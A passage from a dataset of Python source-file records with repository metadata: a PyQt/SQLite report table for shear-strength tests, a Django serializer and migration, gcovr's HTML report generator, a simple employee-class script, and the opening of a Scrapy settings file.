'+str(self.shear_mod_ip)+' Shear Stress'])        \n        \n        \n        #self.tableWidget.setHorizontalHeaderLabels.append('xsdsdsd')\n        connection = sqlite3.connect(\"tyr.db\")\n        results1=connection.execute(\"SELECT TYPE_STR,printf(\\\"%.2f\\\", WIDTH),printf(\\\"%.2f\\\", THICKNESS),printf(\\\"%.2f\\\", CS_AREA),printf(\\\"%.2f\\\", PEAK_LOAD),printf(\\\"%.2f\\\", E_BREAK_LOAD),printf(\\\"%.2f\\\", ULT_SHEAR_STRENGTH_KG_CM),printf(\\\"%.2f\\\", ULT_SHEAR_STRAIN_KG_CM),printf(\\\"%.2f\\\", SHEAR_STRAIN_COLUMN_VALUE_KG_CM),printf(\\\"%.2f\\\", SHEAR_MOD_COLUMN_VALUE_KG_CM),printf(\\\"%.2f\\\",((\"+str(self.shear_mod_ip)+\")/(SHEAR_STRAIN_COLUMN_VALUE_KG_CM)))  FROM REPORT_II_AGGR WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR)\") \n          \n        #results=connection.execute(\"SELECT ((A.REC_ID)-B.MIN_REC_ID)+1 AS SPECIMEN_NO,A.THICKNESS,A.WIDTH,A.CS_AREA,A.PEAK_LOAD,A.E_PAEK_LOAD,A.PERCENTG_E_PEAK_LOAD_MM,A.PERCENTG_E_PEAK_LOAD FROM REPORT_MST_II A, (SELECT MIN(REC_ID) AS MIN_REC_ID, REPORT_ID FROM REPORT_MST_II WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR) ) B WHERE A.REPORT_ID=B.REPORT_ID \")                        \n        for row_number, row_data in enumerate(results1):                    \n            self.tableWidget.insertRow(row_number)\n            for column_number, data in enumerate(row_data):                \n                self.tableWidget.setItem(row_number,column_number,QTableWidgetItem(str(data)))\n                \n        connection.close()                                    \n        #self.tableWidget.resizeColumnsToContents()\n        #self.tableWidget.resizeRowsToContents()\n        \n        \n        connection = sqlite3.connect(\"tyr.db\")\n        results=connection.execute(\"SELECT ((A.REC_ID)-B.MIN_REC_ID)+1 AS SPECIMEN_NO,printf(\\\"%.2f\\\", A.WIDTH),printf(\\\"%.2f\\\", A.THICKNESS),printf(\\\"%.2f\\\", A.CS_AREA),printf(\\\"%.2f\\\", A.PEAK_LOAD),printf(\\\"%.2f\\\", A.E_BREAK_LOAD),printf(\\\"%.2f\\\", A.ULT_SHEAR_STRENGTH_KG_CM),printf(\\\"%.2f\\\", A.ULT_SHEAR_STRAIN_KG_CM),printf(\\\"%.2f\\\", A.SHEAR_STRAIN_COLUMN_VALUE_KG_CM)||'@ '||printf(\\\"%.2f\\\", A.SHEAR_MOD_COLUMN_NAME_KG_CM),printf(\\\"%.2f\\\", A.SHEAR_MOD_COLUMN_VALUE_KG_CM)||'@ '||printf(\\\"%.2f\\\", A.SHEAR_MOD_COLUMN_NAME_KG_CM),printf(\\\"%.2f\\\",((\"+str(self.shear_mod_ip)+\")/(A.SHEAR_STRAIN_COLUMN_VALUE_KG_CM))) FROM REPORT_MST_II A, (SELECT MIN(REC_ID) AS MIN_REC_ID, REPORT_ID FROM REPORT_MST_II WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR) ) B WHERE A.REPORT_ID=B.REPORT_ID\") \n        for row_number, row_data in enumerate(results):                    \n            self.tableWidget.insertRow(row_number)\n            for column_number, data in enumerate(row_data):\n                self.tableWidget.setItem(row_number,column_number,QTableWidgetItem(str(data)))\n        \n        connection.close()\n        \n        \n        self.tableWidget.setEditTriggers(QtWidgets.QTableWidget.NoEditTriggers)  \n   \n    def select_all_rows_ilss(self):\n        self.length=0\n        self.delete_all_records()    \n        self.tableWidget.setMidLineWidth(-4)\n        self.tableWidget.setGridStyle(QtCore.Qt.SolidLine)\n        self.tableWidget.setObjectName(\"tableWidget\")\n        self.tableWidget.setColumnCount(10)\n        font = QtGui.QFont()\n        font.setPointSize(9)\n        self.tableWidget.setFont(font)\n        self.tableWidget.horizontalHeader().setStyleSheet(\"QHeaderView { font-size:  10pt};\")\n        self.tableWidget.verticalHeader().setStyleSheet(\"QHeaderView { font-size:  10pt};\")\n        \n        self.tableWidget.setEditTriggers(QtWidgets.QTableWidget.NoEditTriggers)\n        self.tableWidget.horizontalHeader().setStretchLastSection(True)\n        self.tableWidget.setColumnWidth(0, 80)\n        self.tableWidget.setColumnWidth(1, 80)\n        self.tableWidget.setColumnWidth(2, 80)\n        self.tableWidget.setColumnWidth(3, 80)\n        self.tableWidget.setColumnWidth(4, 180)\n        self.tableWidget.setColumnWidth(5, 100)\n        self.tableWidget.setColumnWidth(6, 100)\n        self.tableWidget.setColumnWidth(7, 100)\n        self.tableWidget.setColumnWidth(8, 200)\n        self.tableWidget.setColumnWidth(9, 300)\n        \n        \n        connection = sqlite3.connect(\"tyr.db\")\n        results=connection.execute(\"SELECT STG_GRAPH_TYPE,STG_UNIT_TYPE FROM GLOBAL_REPORTS_PARAM\") \n        for x in results:           \n            self.unit_typex=x[1]           \n        connection.close()\n        \n        \n        \n        connection = sqlite3.connect(\"tyr.db\")\n        results=connection.execute(\"SELECT MOD_AT_ANY,IFNULL(GUAGE_MM,0) FROM REPORT_MST WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR)\")                        \n        for x in results:            \n                self.shear_mod_ip=str(x[0])\n                self.length=str(x[1])\n        connection.close()    \n         \n        if(self.shear_mod_ip == \"\"):\n            self.shear_mod_ip=100\n        else:\n            pass\n            \n        self.tableWidget.horizontalHeader().setStretchLastSection(True)\n           \n        if(self.unit_typex == \"Kg/Cm\"):\n            self.length=float(int(self.length)*0.1)\n            self.tableWidget.setHorizontalHeaderLabels(['Spec. \\n No','Length \\n (Cm)','Width \\n (Cm)','Thickness \\n (Cm)','Max. Force \\n (Kgf)',' Max. \\n Disp.(Cm) ',' Shear\\n Strength \\n (Kgf/Cm2)','Support \\n SPAN (Cm)',' Failure \\n Mode','Test \\n Method'])        \n        elif(self.unit_typex == \"Lb/Inch\"):\n            self.length=float(int(self.length)*0.0393701)\n            self.tableWidget.setHorizontalHeaderLabels(['Spec. \\n No','Length \\n (Inch)','Width \\n (Inch)','Thickness \\n (Inch)','Max. Force \\n (Lb)',' Max. \\n Disp.(Inch) ',' Shear\\n Strength \\n (Lb\\Inch2)','Support \\n SPAN (Inch)',' Failure \\n Mode','Test \\n Method'])        \n        elif(self.unit_typex == \"Newton/Mm\"):\n            self.tableWidget.setHorizontalHeaderLabels(['Spec. \\n No','Length \\n (Mm)','Width \\n (Mm)','Thickness \\n (Mm)','Max. Force \\n (N)',' Max. \\n Disp.(Mm) ',' Shear\\n Strength \\n (N/Mm2)','Support \\n SPAN (Mm)',' Failure \\n Mode','Test \\n Method'])        \n        elif(self.unit_typex == \"MPA\"):\n            self.tableWidget.setHorizontalHeaderLabels(['Spec. \\n No','Length \\n (Mm)','Width \\n (Mm)','Thickness \\n (Mm)','Max. Force \\n (N)',' Max. \\n Disp.(Mm) ',' Shear\\n Strength \\n (MPA)','Support \\n SPAN (Mm)',' Failure \\n Mode','Test \\n Method'])        \n        else:\n            self.tableWidget.setHorizontalHeaderLabels(['Spec. \\n No','Length \\n (Mm)','Width \\n (Mm)','Thickness \\n (Mm)','Max. Force \\n (Kgf)',' Max. \\n Disp.(Mm) ',' Shear\\n Strength','Support \\n SPAN (Mm)',' Failure \\n Mode','Test \\n Method'])        \n        \n        \n        #self.tableWidget.setHorizontalHeaderLabels.append('xsdsdsd')\n        connection = sqlite3.connect(\"tyr.db\")\n        results1=connection.execute(\"SELECT TYPE_STR,\"+str(self.length)+\",printf(\\\"%.2f\\\", WIDTH),printf(\\\"%.2f\\\", THICKNESS),printf(\\\"%.2f\\\", PEAK_LOAD),printf(\\\"%.2f\\\", E_BREAK_LOAD),printf(\\\"%.2f\\\", ULT_SHEAR_STRENGTH_KG_CM),printf(\\\"%.2f\\\", SPAN),BREAK_MODE,NULL FROM REPORT_II_AGGR WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR)\") \n          \n        #results=connection.execute(\"SELECT ((A.REC_ID)-B.MIN_REC_ID)+1 AS SPECIMEN_NO,A.THICKNESS,A.WIDTH,A.CS_AREA,A.PEAK_LOAD,A.E_PAEK_LOAD,A.PERCENTG_E_PEAK_LOAD_MM,A.PERCENTG_E_PEAK_LOAD FROM REPORT_MST_II A, (SELECT MIN(REC_ID) AS MIN_REC_ID, REPORT_ID FROM REPORT_MST_II WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR) ) B WHERE A.REPORT_ID=B.REPORT_ID \")                        \n        for row_number, row_data in enumerate(results1):                    \n            self.tableWidget.insertRow(row_number)\n            for column_number, data in enumerate(row_data):                \n                self.tableWidget.setItem(row_number,column_number,QTableWidgetItem(str(data)))\n                \n        connection.close()                                    \n        #self.tableWidget.resizeColumnsToContents()\n        #self.tableWidget.resizeRowsToContents()\n        \n        \n        connection = sqlite3.connect(\"tyr.db\")\n        results=connection.execute(\"SELECT ((A.REC_ID)-B.MIN_REC_ID)+1 AS SPECIMEN_NO,\"+str(self.length)+\",printf(\\\"%.2f\\\", A.WIDTH),printf(\\\"%.2f\\\", A.THICKNESS),printf(\\\"%.2f\\\", A.PEAK_LOAD),printf(\\\"%.2f\\\", A.E_BREAK_LOAD),printf(\\\"%.2f\\\", A.ULT_SHEAR_STRENGTH_KG_CM),printf(\\\"%.2f\\\", A.SPAN),A.BREAK_MODE,A.TEST_METHOD FROM REPORT_MST_II A, (SELECT MIN(REC_ID) AS MIN_REC_ID, REPORT_ID FROM REPORT_MST_II WHERE REPORT_ID IN (SELECT NEW_REPORT_ID FROM GLOBAL_VAR) ) B WHERE A.REPORT_ID=B.REPORT_ID\") \n        for row_number, row_data in enumerate(results):                    \n            self.tableWidget.insertRow(row_number)\n            for column_number, data in enumerate(row_data):\n                self.tableWidget.setItem(row_number,column_number,QTableWidgetItem(str(data)))\n        \n        connection.close()\n        \n        \n        self.tableWidget.setEditTriggers(QtWidgets.QTableWidget.NoEditTriggers)  \n   \n   \n   \nif __name__ == \"__main__\":\n    import sys\n    app = QtWidgets.QApplication(sys.argv)\n    MainWindow = QtWidgets.QMainWindow()\n    ui = TY_06_Ui_MainWindow()\n    ui.setupUi(MainWindow)\n    MainWindow.show()\n    sys.exit(app.exec_())\n"}
{"blob_id": "045f258301bee7674dcd16739dd1597ed6944b0f", "directory_id": "640e163318e54113846624af1e29cc475fe3d831", "path": "/expense/api/serializers.py", "content_id": "e02392ae3004da6a7a21eb2052ca9334c0063bb5", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "adanflorez/bcs", "snapshot_id": "57042f2bbd2d67629c98cf0e2f6952c681c94204", "revision_id": "d5383f8747f7d603a2d52c80c156352ee2e2e886", "branch_name": "refs/heads/develop", "visit_date": "2023-08-31 08:57:07.312443", "revision_date": "2021-10-26 03:08:48", "committer_date": "2021-10-26 03:08:48", "github_id": "419458190", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "2021-10-23 00:21:54", "gha_created_at": "2021-10-20 19:08:28", "gha_language": "JavaScript", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "320", "extension": "py", "content": "from rest_framework import serializers\n\nfrom budget.api.serializers import BudgetSerializer\nfrom expense.models import Expense\n\n\nclass ExpenseSerializer(serializers.ModelSerializer):\n    budget = BudgetSerializer()\n\n    class Meta:\n        model = Expense\n        fields = ['subject', 'description', 'amount', 'budget']\n"}
{"blob_id": "6bdde7e0eb3456110ccd7b9ebb47f6de617d56fc", "directory_id": "02946eab5097178bbd130c209204e54b730a67c4", "path": "/store/migrations/0003_selleraccount.py", "content_id": "ee3edaac891f27848bba61c1da8d43e592f03286", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "Garvit-32/nursery", "snapshot_id": "9739366c7f777e3f61334675587818a19ea528f1", "revision_id": "beac826508486af36a0bb18053ce1febeead01f2", "branch_name": "refs/heads/master", "visit_date": "2022-11-29 09:40:41.375198", "revision_date": "2020-08-11 09:07:58", "committer_date": "2020-08-11 09:07:58", "github_id": "286662877", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "840", "extension": "py", "content": "# Generated by Django 3.0.7 on 2020-08-07 15:34\n\nfrom django.db import migrations, models\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('store', '0002_auto_20200807_1447'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='SellerAccount',\n            fields=[\n                ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),\n                ('sellerId', models.CharField(blank=True, max_length=15, unique=True)),\n                ('name', models.CharField(max_length=200, null=True)),\n                ('email', models.CharField(max_length=200, null=True)),\n                ('phone', models.CharField(max_length=15, null=True)),\n                ('organization', models.CharField(max_length=200, null=True)),\n            ],\n        ),\n    ]\n"}
{"blob_id": "a83902073018ecf8a5177e1f88882ba774ed2e77", "directory_id": "cfdafe639631ccd5386144a6ba513832e6979d53", "path": "/gcovr/html_generator.py", "content_id": "5257d3c7bb76401030155b1198b90c55e6a14d97", "detected_licenses": "['LicenseRef-scancode-unknown-license-reference', 'BSD-3-Clause']", "license_type": "permissive", "repo_name": "Valitseja/gcovr", "snapshot_id": "cfe86670b86b3d32b22a72b7c01e13772a3bfe2a", "revision_id": "fa8e801ed93ff85d66750e51a3d04ca96b793aaa", "branch_name": "refs/heads/master", "visit_date": "2020-03-09 17:55:27.891497", "revision_date": "2018-04-06 20:12:59", "committer_date": "2018-04-06 22:27:47", "github_id": "None", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "11769", "extension": "py", "content": "# -*- coding:utf-8 -*-\n\n# This file is part of gcovr <http://gcovr.com/>.\n#\n# Copyright 2013-2018 the gcovr authors\n# Copyright 2013 Sandia Corporation\n# This software is distributed under the BSD license.\n\nimport os\nimport sys\nimport time\nimport datetime\nimport zlib\n\nfrom .version import __version__\nfrom .utils import commonpath, sort_coverage\n\n\nclass lazy(object):\n    def __init__(self, fn):\n\n        def load():\n            result = fn()\n\n            def reuse_value():\n                return result\n\n            self.get = reuse_value\n            return result\n\n        self.get = load\n\n    def __call__(self):\n        return self.get()\n\n\n# Loading Jinja and preparing the environmen is fairly costly.\n# Only do this work if templates are actually used.\n# This speeds up text and XML output.\n@lazy\ndef templates():\n    from jinja2 import Environment, PackageLoader\n    return Environment(\n        loader=PackageLoader('gcovr'),\n        autoescape=False,\n        trim_blocks=True,\n        lstrip_blocks=True)\n\n\nmedium_coverage = 75.0\nhigh_coverage = 90.0\nlow_color = \"LightPink\"\nmedium_color = \"#FFFF55\"\nhigh_color = \"LightGreen\"\ncovered_color = \"LightGreen\"\nuncovered_color = \"LightPink\"\ntakenBranch_color = \"Green\"\nnotTakenBranch_color = \"Red\"\n\n\ndef html_escape(s):\n    \"\"\"Escape string for inclusion in a HTML body.\n\n    Does not escape ``'``, ``\"``, or ``>``.\n    \"\"\"\n    s = s.replace('&', '&amp;')\n    s = s.replace('<', '&lt;')\n    return s\n\n\ndef calculate_coverage(covered, total, nan_value=0.0):\n    return nan_value if total == 0 else round(100.0 * covered / total, 1)\n\n\ndef coverage_to_color(coverage):\n    if coverage is None:\n        return 'LightGray'\n    elif coverage < medium_coverage:\n        return low_color\n    elif coverage < high_coverage:\n        return medium_color\n    else:\n        return high_color\n\n\n#\n# Produce an HTML report\n#\ndef print_html_report(covdata, options):\n    details = options.html_details\n    if options.output is None:\n        details = False\n    data = {}\n    data['HEAD'] = \"Head\"\n    data['VERSION'] = __version__\n    data['TIME'] = str(int(time.time()))\n    data['DATE'] = datetime.datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\")\n    data['ROWS'] = []\n    data['ENC'] = options.html_encoding\n    data['low_color'] = low_color\n    data['medium_color'] = medium_color\n    data['high_color'] = high_color\n    data['COVERAGE_MED'] = medium_coverage\n    data['COVERAGE_HIGH'] = high_coverage\n    data['CSS'] = templates().get_template('style.css').render(\n        low_color=low_color,\n        medium_color=medium_color,\n        high_color=high_color,\n        covered_color=covered_color,\n        uncovered_color=uncovered_color,\n        takenBranch_color=takenBranch_color,\n        notTakenBranch_color=notTakenBranch_color\n    )\n    data['DIRECTORY'] = ''\n\n    branchTotal = 0\n    branchCovered = 0\n    for key in covdata.keys():\n        (total, covered, percent) = covdata[key].coverage(show_branch=True)\n        branchTotal += total\n        branchCovered += covered\n    data['BRANCHES_EXEC'] = str(branchCovered)\n    data['BRANCHES_TOTAL'] = str(branchTotal)\n    coverage = calculate_coverage(branchCovered, branchTotal, nan_value=None)\n    data['BRANCHES_COVERAGE'] = '-' if coverage is None else str(coverage)\n    data['BRANCHES_COLOR'] = coverage_to_color(coverage)\n\n    lineTotal = 0\n    lineCovered = 0\n    for key in covdata.keys():\n        (total, covered, percent) = covdata[key].coverage(show_branch=False)\n        lineTotal += total\n        lineCovered += covered\n    data['LINES_EXEC'] = str(lineCovered)\n    data['LINES_TOTAL'] = str(lineTotal)\n    coverage = calculate_coverage(lineCovered, lineTotal)\n    data['LINES_COVERAGE'] = str(coverage)\n    data['LINES_COLOR'] = coverage_to_color(coverage)\n\n    # Generate the coverage output (on a per-package basis)\n    # source_dirs = set()\n    files = []\n    dirs = []\n    filtered_fname = ''\n    keys = sort_coverage(\n        covdata, show_branch=False,\n        by_num_uncovered=options.sort_uncovered,\n        by_percent_uncovered=options.sort_percent)\n    for f in keys:\n        cdata = covdata[f]\n        filtered_fname = options.root_filter.sub('', f)\n        files.append(filtered_fname)\n        dirs.append(os.path.dirname(filtered_fname) + os.sep)\n        cdata._filename = filtered_fname\n        if not details:\n            cdata._sourcefile = None\n        else:\n            ttmp = os.path.abspath(options.output).split('.')\n            longname = cdata._filename.replace(os.sep, '_')\n            longname_hash = \"\"\n            while True:\n                if len(ttmp) > 1:\n                    cdata._sourcefile = \\\n                        '.'.join(ttmp[:-1]) + \\\n                        '.' + longname + longname_hash + \\\n                        '.' + ttmp[-1]\n                else:\n                    cdata._sourcefile = \\\n                        ttmp[0] + '.' + longname + longname_hash + '.html'\n                # we add a hash at the end and attempt to shorten the\n                # filename if it exceeds common filesystem limitations\n                if len(os.path.basename(cdata._sourcefile)) < 256:\n                    break\n                longname_hash = \"_\" + hex(zlib.crc32(longname) & 0xffffffff)[2:]\n                longname = longname[(len(cdata._sourcefile) - len(longname_hash)):]\n\n    # Define the common root directory, which may differ from options.root\n    # when source files share a common prefix.\n    if len(files) > 1:\n        commondir = commonpath(files)\n        if commondir != '':\n            data['DIRECTORY'] = commondir\n    else:\n        dir_, file_ = os.path.split(filtered_fname)\n        if dir_ != '':\n            data['DIRECTORY'] = dir_ + os.sep\n\n    nrows = 0\n    for f in keys:\n        cdata = covdata[f]\n        class_lines = 0\n        class_hits = 0\n        class_branches = 0\n        class_branch_hits = 0\n        for line in sorted(cdata.all_lines):\n            hits = cdata.covered.get(line, 0)\n            class_lines += 1\n            if hits > 0:\n                class_hits += 1\n            branches = cdata.branches.get(line)\n            if branches is None:\n                pass\n            else:\n                b_hits = 0\n                for v in branches.values():\n                    if v > 0:\n                        b_hits += 1\n                coverage = 100 * b_hits / len(branches)\n                class_branch_hits += b_hits\n                class_branches += len(branches)\n\n        lines_covered = calculate_coverage(class_hits, class_lines, nan_value=100.0)\n        branches_covered = calculate_coverage(class_branch_hits, class_branches, nan_value=None)\n\n        nrows += 1\n        data['ROWS'].append(html_row(\n            options, details, cdata._sourcefile, nrows,\n            directory=data['DIRECTORY'],\n            filename=os.path.relpath(\n                os.path.realpath(cdata._filename), data['DIRECTORY']),\n            LinesExec=class_hits,\n            LinesTotal=class_lines,\n            LinesCoverage=lines_covered,\n            BranchesExec=class_branch_hits,\n            BranchesTotal=class_branches,\n            BranchesCoverage=branches_covered\n        ))\n\n    if data['DIRECTORY'] == '':\n        data['DIRECTORY'] = \".\"\n    data['DIRECTORY'] = data['DIRECTORY'].replace('\\\\', '/')\n\n    htmlString = templates().get_template('root_page.html').render(**data)\n\n    if options.output is None:\n        sys.stdout.write(htmlString + '\\n')\n    else:\n        OUTPUT = open(options.output, 'w')\n        OUTPUT.write(htmlString + '\\n')\n        OUTPUT.close()\n\n    # Return, if no details are requested\n    if not details:\n        return\n\n    #\n    # Generate an HTML file for every source file\n    #\n    for f in keys:\n        cdata = covdata[f]\n\n        data['FILENAME'] = cdata._filename\n        data['ROWS'] = ''\n\n        branchTotal, branchCovered, tmp = cdata.coverage(show_branch=True)\n        data['BRANCHES_EXEC'] = str(branchCovered)\n        data['BRANCHES_TOTAL'] = str(branchTotal)\n        coverage = calculate_coverage(branchCovered, branchTotal, nan_value=None)\n        data['BRANCHES_COVERAGE'] = '-' if coverage is None else str(coverage)\n        data['BRANCHES_COLOR'] = coverage_to_color(coverage)\n\n        lineTotal, lineCovered, tmp = cdata.coverage(show_branch=False)\n        data['LINES_EXEC'] = str(lineCovered)\n        data['LINES_TOTAL'] = str(lineTotal)\n        coverage = calculate_coverage(lineCovered, lineTotal)\n        data['LINES_COVERAGE'] = str(coverage)\n        data['LINES_COLOR'] = coverage_to_color(coverage)\n\n        data['ROWS'] = []\n        currdir = os.getcwd()\n        os.chdir(options.root_dir)\n        INPUT = open(data['FILENAME'], 'r')\n        ctr = 1\n        for line in INPUT:\n            data['ROWS'].append(\n                source_row(ctr, line.rstrip(), cdata)\n            )\n            ctr += 1\n        INPUT.close()\n        os.chdir(currdir)\n\n        htmlString = templates().get_template('source_page.html').render(**data)\n        OUTPUT = open(cdata._sourcefile, 'w')\n        OUTPUT.write(htmlString + '\\n')\n        OUTPUT.close()\n\n\ndef source_row(lineno, source, cdata):\n    kwargs = {}\n    kwargs['lineno'] = str(lineno)\n    if lineno in cdata.covered:\n        kwargs['covclass'] = 'coveredLine'\n        kwargs['linebranch'] = ''\n        # If line has branches them show them with ticks or crosses\n        if lineno in cdata.branches.keys():\n            branches = cdata.branches.get(lineno)\n            branchcounter = 0\n            for branch in branches:\n                if branches[branch] > 0:\n                    kwargs['linebranch'] += '<span class=\"takenBranch\" title=\"Branch ' + str(branch) + ' taken ' + str(branches[branch]) + ' times\">&check;</span>'\n                else:\n                    kwargs['linebranch'] += '<span class=\"notTakenBranch\" title=\"Branch ' + str(branch) + ' not taken\">&cross;</span>'\n                branchcounter += 1\n                # Wrap at 4 branches to avoid too wide column\n                if (branchcounter > 0) and ((branchcounter % 4) == 0):\n                    kwargs['linebranch'] += '<br/>'\n        kwargs['linecount'] = str(cdata.covered.get(lineno, 0))\n    elif lineno in cdata.uncovered:\n        kwargs['covclass'] = 'uncoveredLine'\n        kwargs['linebranch'] = ''\n        kwargs['linecount'] = ''\n    else:\n        kwargs['covclass'] = ''\n        kwargs['linebranch'] = ''\n        kwargs['linecount'] = ''\n    kwargs['source'] = html_escape(source)\n    return kwargs\n\n\n#\n# Generate the table row for a single file\n#\ndef html_row(options, details, sourcefile, nrows, **kwargs):\n    if details and options.relative_anchors:\n        sourcefile = os.path.basename(sourcefile)\n    if nrows % 2 == 0:\n        kwargs['altstyle'] = 'style=\"background-color:LightSteelBlue\"'\n    else:\n        kwargs['altstyle'] = ''\n    if details:\n        kwargs['filename'] = '<a href=\"%s\">%s</a>' % (\n            sourcefile, kwargs['filename'].replace('\\\\', '/')\n        )\n    kwargs['LinesCoverage'] = round(kwargs['LinesCoverage'], 1)\n    # Disable the border if the bar is too short to see the color\n    if kwargs['LinesCoverage'] < 1e-7:\n        kwargs['BarBorder'] = \"border:white; \"\n    else:\n        kwargs['BarBorder'] = \"\"\n    if kwargs['LinesCoverage'] < medium_coverage:\n        kwargs['LinesColor'] = low_color\n        kwargs['LinesBar'] = 'red'\n    elif kwargs['LinesCoverage'] < high_coverage:\n        kwargs['LinesColor'] = medium_color\n        kwargs['LinesBar'] = 'yellow'\n    else:\n        kwargs['LinesColor'] = high_color\n        kwargs['LinesBar'] = 'green'\n\n    kwargs['BranchesColor'] = coverage_to_color(kwargs['BranchesCoverage'])\n    kwargs['BranchesCoverage'] = '-' if kwargs['BranchesCoverage'] is None else round(kwargs['BranchesCoverage'], 1)\n\n    return kwargs\n"}
{"blob_id": "4ac917c8e0f8c1f7f6e2061b287b3e5e083f2403", "directory_id": "983050200a99868ce73452014ee21b83ae351756", "path": "/test_class.py", "content_id": "9063a525806350edab776cc713e622f979569015", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "mmartinez1987/gns3", "snapshot_id": "2b046e32555d3d1a1ad888410b6ed57e4bff8c38", "revision_id": "94e26af65a576920b8dc5496305a5ce0369f28dc", "branch_name": "refs/heads/master", "visit_date": "2021-09-09 19:01:44.399088", "revision_date": "2018-03-19 02:54:16", "committer_date": "2018-03-19 02:54:16", "github_id": "105952968", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "1760", "extension": "py", "content": "import sys\nimport socket\nimport random\n\nclass person(object):\n\n\tdef __init__(self, name, age): #instantitate person object\n\t\tself.name = name\n\t\tself.age = age\n\t\tself.id = ''\n\t\tself.salary = ''\n\t\tself.position = ''\n\t\tself.status = ''\n\t\t\n\tdef getName(self): #return name of person\n\t\treturn self.name\n\n\tdef getAge(self): #return age of person\n\t\treturn self.age\n\n\tdef getId(self): #return age of person\n\t\treturn self.id\n\n\tdef changeName(self, new_name): #change persons name\n\t\tself.name = new_name\n\t\tprint('Name has been changed to %s' % new_name)\n\n\tdef changeAge(self, new_age): #change persons age\n\t\tself.age = new_age\n\t\tprint('Name has been changed to %s' % new_age)\n\n\tdef generateId(self): #generate ID for person object\n\t\tself.id = random.randint(1,1000)\n\n\tdef createPosition(self, position): #assign position to person\n\t\tself.position = position\n\n\tdef updateStatus(self, status): #change persons status (Active or inactive)\n\t\tself.status = status\n\n\tdef updateSalary(self, salary): #update persons salary\n\t\tself.salary = salary\n\ndef main():\n\tans = 'y'\n\twhile (ans == 'y'):\n\t\tname = input(\"Please enter employee name: \")\n\t\tage = input(\"Please enter employees age: \")\n\t\temployee = person(name, age)\n\t\tname = employee.getName()\n\t\tprint(name)\n\t\tage = employee.getAge()\n\t\tprint(age)\n\t\tprint('Generating employee ID')\n\t\temployee.generateId()\n\t\tid = employee.getId()\n\t\tprint(\"ID is %s\" % id)\n\t\tnew_name = input(\"Please enter the new name for this employee: \")\n\t\tprint('New name is %s' % new_name)\n\t\tnew_age = input('Please enter the new age for this employee: ')\n\t\temployee.changeName(new_name)\n\t\temployee.changeAge(new_age)\n\t\tans = input(\"Do you want to add another employee(y/n)\")\n\t\tif ans == 'n': print('Quitting program...')\n\n\nif __name__ == '__main__':\n\tmain()\n"}
{"blob_id": "a8ecbba50ca34d544e8f737079631b012cfb4bd8", "directory_id": "b247e77ac4668063536edc7a1aaacdec6bccd200", "path": "/weather_sender/weather_sender/settings.py", "content_id": "661f32b90bd2622ba06d16e3f3002dfa6616e368", "detected_licenses": "[]", "license_type": "no_license", "repo_name": "yujaemin/weather_sender", "snapshot_id": "c67cf31c68e8dd6bcdbc8f994b427445cf1c2ce6", "revision_id": "63fbf6a83af79f97edd563408369113ca3c9037c", "branch_name": "refs/heads/master", "visit_date": "2021-01-01 03:47:10.147813", "revision_date": "2016-04-27 02:02:14", "committer_date": "2016-04-27 02:02:14", "github_id": "57174684", "star_events_count": "0", "fork_events_count": "0", "gha_license_id": "None", "gha_event_created_at": "None", "gha_created_at": "None", "gha_language": "None", "src_encoding": "UTF-8", "language": "Python", "is_vendor": "False", "is_generated": "False", "length_bytes": "3052", "extension": "py", "content": "# -*- coding: utf-8 -*-\n\n# Scrapy settings for weather_sender project\n#\n# For simplicity, this file contains only settings considered important or\n# commonly used. You can find more settings consulting the documentation:\n#\n#     http://doc.scrapy.org/en/latest/topics/settings.html\n#     http://scrapy.readthedocs.org/en/latest/topics/downloader-middleware.html\n#     http://scrapy.readthedocs.org/en/latest/topics/spider-middleware.html\n\nBOT_NAME = 'weather_sender'\n\nSPIDER_MODULES = ['weather_sender.spiders']\nNEWSPIDER_MODULE = 'weather_sender.spiders'\n\n\n# Crawl responsibly by identifying yourself (and your website) on the user-agent\n#USER_AGENT = 'weather_sender (+http://www.yourdomain.com)'\n\n# Configure maximum concurrent requests performed by Scrapy (default: 16)\n#CONCURRENT_REQUESTS=32\n\n# Configure a delay for requests for the same website (default: 0)\n# See http://scrapy.readthedocs.org/en/latest/topics/settings.html#download-delay\n# See also autothrottle settings and docs\n#DOWNLOAD_DELAY=3\n# The download delay setting will honor only one of:\n#CONCURRENT_REQUESTS_PER_DOMAIN=16\n#CONCURRENT_REQUESTS_PER_IP=16\n\n# Disable cookies (enabled by default)\n#COOKIES_ENABLED=False\n\n# Disable Telnet Console (enabled by default)\n#TELNETCONSOLE_ENABLED=False\n\n# Override the default request headers:\n#DEFAULT_REQUEST_HEADERS = {\n#   'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n#   'Accept-Language': 'en',\n#}\n\n# Enable or disable spider middlewares\n# See http://scrapy.readthedocs.org/en/latest/topics/spider-middleware.html\n#SPIDER_MIDDLEWARES = {\n#    'weather_sender.middlewares.MyCustomSpiderMiddleware': 543,\n#}\n\n# Enable or disable downloader middlewares\n# See 